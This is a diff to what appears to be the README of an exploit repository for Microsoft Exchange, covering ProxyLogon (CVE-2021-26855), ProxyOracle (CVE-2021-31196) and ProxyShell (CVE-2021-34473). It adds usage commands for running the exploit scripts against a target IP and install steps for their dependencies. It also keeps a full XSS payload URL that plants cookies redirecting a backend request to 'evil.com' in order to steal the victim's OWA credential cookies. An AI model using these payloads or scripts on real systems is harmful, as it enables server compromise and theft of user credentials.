@@ -4,17 +4,33 @@
 
 `Usage: python3 26855.py 1.1.1.1`
 
+![](img/26855.png)
+
 ### ProxyOracle
 
-``` bash
+``` url
 https://ews.lab/owa/auth/frowny.aspx?app=people&et=ServerError&esrc=MasterPage&te=\&refurl=}}};document.cookie=`X-AnonResource-Backend=@evil.com:443/path/any.php%23~1941962753`;document.cookie=`X-AnonResource=true`;fetch(`/owa/auth/any.skin`,{credentials:`include`});//
+```
+
+``` bash
+pip3 install pycryptodome
 
 Usage: python3 31196.py 1.1.1.1 'cdata=xxx; cadataTTL=yyy; ...'
 ```
 
+![](img/31196.png)
+
 ### ProxyShell
 
-`Wait For Update`
+``` bash
+pip3 install pypsrp
+
+Usage: python3 34473.py 1.1.1.1
+```
+
+![](img/34473.png)
+
+`Wait For Update FileWrite Exp(31207.py)`
 
 ## Reference
 
